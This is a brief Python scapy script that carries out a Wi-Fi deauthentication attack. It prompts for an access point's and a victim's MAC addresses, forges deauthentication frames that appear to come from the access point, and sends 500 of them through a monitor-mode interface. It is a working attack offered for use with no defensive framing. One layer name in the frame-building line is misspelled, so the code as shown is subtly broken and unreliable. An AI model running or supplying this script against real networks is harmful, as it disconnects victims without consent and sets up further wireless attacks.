from scapy.all import *
import sys

BSSID = input("Enter Mac Address of access points: ")
victim_mac = input("Enter mac address of victim: ")
frame = RadioTap()/Dot11(addr1 = victim_mac, addr2 = BSSID, addr3 = BSSID)/Dot1Deauth()

sendp(frame, iface = "mon0", count = 500, inter = 1)
